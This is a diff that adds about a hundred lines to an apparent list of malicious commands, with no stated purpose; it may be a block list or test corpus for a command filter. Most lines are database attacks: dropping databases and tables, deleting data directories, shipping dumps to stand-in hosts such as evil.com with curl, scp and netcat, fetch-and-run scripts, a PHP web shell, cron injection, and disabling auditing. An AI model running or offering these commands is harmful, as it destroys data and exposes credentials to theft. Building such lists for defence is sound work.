@@ -423,3 +423,104 @@ bitsadmin /transfer badjob http://evil.com/backdoor.exe C:\Users\Public\backdoor
 certutil -urlcache -f http://evil.com/m.exe back.exe
 set /p user=<nul > \\.\PhysicalDrive0
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d "cmd.exe /c calc.exe" /f
+mysql -u root -p -e "DROP DATABASE production;"
+mysql -u root -p -e "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'badpass';"
+mysql -u root -p -e "DELETE FROM users;"
+echo "DROP TABLE users;" | mysql -u root -p
+echo "DROP SCHEMA public CASCADE;" | psql -U postgres -d mydb
+echo "DROP USER attacker;" | sqlplus sys/admin AS SYSDBA
+echo "DELETE FROM pg_shadow;" | psql -U postgres
+sqlite3 /var/db/main.db "DELETE FROM users;"
+sqlite3 /var/db/main.db "DROP TABLE secrets;"
+cp /var/lib/mysql/mysql/user.MYD /tmp/exfiltrated_user.MYD
+scp /var/lib/postgresql/13/main/pg_hba.conf attacker@evil.com:/tmp/
+tar -czf dump.tar.gz /var/lib/mysql/ && curl -T dump.tar.gz http://evil.com/upload/
+pg_dumpall > dump.sql && curl -F "file=@dump.sql" http://evil.com/recv
+mysqldump -u root -p --all-databases > /tmp/leak.sql
+echo "UPDATE mysql.user SET Host='%'; FLUSH PRIVILEGES;" | mysql -u root -p
+mysql -e "SOURCE /tmp/malicious.sql"
+sqlplus / as sysdba @/tmp/drop_all.sql
+cat /etc/oratab | while read db; do echo "DROP USER PUBLIC CASCADE;" | sqlplus sys as sysdba; done
+rm -rf /var/lib/mysql/
+rm -rf /var/lib/postgresql/
+find / -name "*.db" -exec rm {} \;
+find / -name "*.sqlite" -exec cp {} /tmp/ \;
+wget http://attacker.com/mysql_backdoor.sql -O /tmp/m.sql && mysql < /tmp/m.sql
+curl -O http://malicious.com/psql_wipe.sh && bash psql_wipe.sh
+sqlite3 /tmp/data.db ".dump" > /tmp/dump.sql && curl -F "file=@/tmp/dump.sql" http://evil.com/
+echo "<?php system('sqlite3 /data.db < wipe.sql'); ?>" > /var/www/html/backdoor.php
+echo "SELECT * FROM credit_cards;" | mysql -u root -p > /tmp/cards.txt && scp /tmp/cards.txt attacker@evil.com:/data/
+mysqladmin -u root -p shutdown
+pg_ctl stop -D /var/lib/postgresql/13/main -m immediate
+mysql_upgrade --force --user=root --password=badpass
+DROPBOX_TOKEN=abc123 ./upload_db.sh /var/lib/mysql/
+netcat -w 3 attacker.com 4444 < /var/lib/mysql/mysql/user.frm
+echo "SELECT * FROM credentials;" | sqlplus /nolog @connect.sql > /tmp/dump && curl -F "file=@/tmp/dump" http://attacker.io/
+sqlite3 ~/.mozilla/firefox/*.sqlite "DROP TABLE logins;"
+sudo mv /usr/bin/mysql /usr/bin/.mysql_hidden
+iptables -A OUTPUT -d db.example.com -j DROP
+echo 'exit' | sqlplus sys as sysdba | tee /var/log/hack.log
+psql -U postgres -c "COPY users TO '/tmp/u.csv' DELIMITER ',' CSV;"
+mysql -e "UPDATE admin SET password='hacked';"
+mysql -e "INSERT INTO cron_jobs VALUES ('*/5 * * * * root wget http://evil.com/b.sh -O- | bash');"
+mysql --execute="DROP DATABASE accounting;"
+rm -f /etc/mysql/conf.d/*
+echo "[mysqld]\nskip-grant-tables" >> /etc/mysql/my.cnf && systemctl restart mysql
+ln -sf /bin/bash /var/lib/mysql/mysql.sock
+chmod +x /tmp/mysqld_safe && /tmp/mysqld_safe --skip-grant-tables &
+pg_ctlcluster 12 main stop && rm -rf /var/lib/postgresql/12/main
+mysqladmin -u root -p reload && sleep 5 && killall -9 mysqld
+zip -r dbs.zip /var/lib/mysql/ && curl -T dbs.zip http://evil.com/
+rm -f /var/backups/mysql/* && echo "All backups deleted"
+find / -type f -name "*.sql" -exec curl -F "file=@{}" http://evil.com/upload \;
+DROP USER SCOTT CASCADE;
+DROP TABLE users PURGE;
+DELETE FROM dba_users WHERE username = 'HR';
+UPDATE dba_users SET account_status = 'LOCKED' WHERE username != 'SYS';
+TRUNCATE TABLE audit_log;
+DROP ROLE DBA;
+REVOKE DBA FROM PUBLIC;
+GRANT DBA TO HACKER;
+CREATE USER hacker IDENTIFIED BY hack123 DEFAULT TABLESPACE users TEMPORARY TABLESPACE temp;
+GRANT CREATE SESSION TO hacker;
+ALTER USER SYS IDENTIFIED BY compromised;
+CREATE OR REPLACE PROCEDURE kill_sys AS BEGIN EXECUTE IMMEDIATE 'DROP USER SYS CASCADE'; END;
+UPDATE system.parameters SET value='false' WHERE name='enable_audit';
+EXECUTE IMMEDIATE 'DROP TABLE SYSTEM.CREDENTIALS';
+DROP TABLESPACE users INCLUDING CONTENTS AND DATAFILES;
+TRUNCATE TABLE system.settings;
+DELETE FROM dba_profiles WHERE profile = 'DEFAULT';
+DROP MATERIALIZED VIEW all_users_mv;
+UPDATE dba_tab_privs SET privilege='ALL' WHERE grantee='HACKER';
+DELETE FROM v$session WHERE username IS NOT NULL;
+CREATE PUBLIC SYNONYM dual FOR hr.employees;
+DELETE FROM dba_sys_privs WHERE privilege = 'SELECT ANY TABLE';
+DROP DIRECTORY DATA_PUMP_DIR;
+RENAME SYSTEM TO SYSTEM_OLD;
+CREATE OR REPLACE FUNCTION drop_all RETURN VARCHAR2 IS BEGIN EXECUTE IMMEDIATE 'DROP USER SYSTEM CASCADE'; RETURN 'done'; END;
+ALTER SYSTEM SET open_cursors=0 SCOPE=SPFILE;
+DELETE FROM sys.aud$;
+DROP INDEX sys.idx_audit_log;
+DROP TRIGGER login_trigger;
+DELETE FROM dba_ts_quotas;
+DROP PROCEDURE log_event;
+TRUNCATE TABLE dba_jobs;
+ALTER SYSTEM SET db_recovery_file_dest_size=1M;
+ALTER SYSTEM SET audit_trail=NONE SCOPE=SPFILE;
+CREATE OR REPLACE TRIGGER disable_login AFTER LOGON ON DATABASE BEGIN EXECUTE IMMEDIATE 'ALTER USER SYS ACCOUNT LOCK'; END;
+UPDATE dba_users SET password='123456' WHERE username='SYS';
+ALTER SYSTEM SET RESOURCE_LIMIT=FALSE;
+DROP CONTEXT app_ctx;
+DELETE FROM dba_hist_sqlstat;
+ALTER PROFILE DEFAULT LIMIT FAILED_LOGIN_ATTEMPTS UNLIMITED;
+CREATE OR REPLACE VIEW users_pw AS SELECT username, password FROM dba_users;
+DROP PACKAGE sys.utl_http;
+UPDATE dba_users SET expiry_date = SYSDATE - 1 WHERE username='ADMIN';
+TRUNCATE TABLE system.backup_status;
+DROP TYPE sys.htp;
+ALTER DATABASE OPEN RESETLOGS;
+CREATE OR REPLACE DIRECTORY backup_dir AS '/tmp/hack';
+UPDATE dba_roles SET authentication_type='NONE';
+DROP SEQUENCE user_seq;
+DELETE FROM dba_registry;
+DROP USER PUBLIC CASCADE;
